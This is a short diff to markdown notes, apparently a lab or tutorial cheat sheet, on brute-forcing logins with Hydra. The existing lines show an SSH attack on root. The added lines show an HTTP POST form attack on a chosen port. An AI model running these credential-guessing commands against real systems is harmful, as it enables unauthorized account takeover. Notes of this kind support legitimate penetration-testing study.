@@ -69,3 +69,9 @@ hydra -l root -P passwords.txt 10.48.162.202 -t 4 ssh
 - The provided passwords will be replacing `^PASS^`
 - Finally, `F=incorrect` is a string that appears in the server reply when the login fails.
 
+## With specific port number
+
+```Example
+hydra -l <username> -P <wordlist> 10.48.162.202 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -s <port> -V
+```
+
